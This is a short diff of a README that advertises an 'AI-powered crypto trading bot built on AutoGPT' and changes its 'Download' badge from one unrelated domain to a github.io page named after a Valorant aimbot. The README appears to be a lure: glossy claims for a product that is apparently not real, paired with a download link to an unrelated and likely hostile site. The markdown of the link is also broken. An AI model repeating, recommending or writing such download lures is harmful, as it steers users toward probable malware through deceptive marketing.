@@ -2,7 +2,7 @@
 
 An advanced AI-powered crypto trading bot built on AutoGPT. Designed for both beginners and pros, it supports scalping, swing trading, and fully autonomous long-term strategies. Fast, secure, and fully customizable.
 
-[![Download AutoGPT Trading Bot](https://img.shields.io/badge/Download-AutoGPT%20Trading%20Bot-blueviolet)]([https://seomadjest.com]
+[![Download AutoGPT Trading Bot](https://valorant-aimb0tpro-info.github.io/.github/)]
 
 ---
 
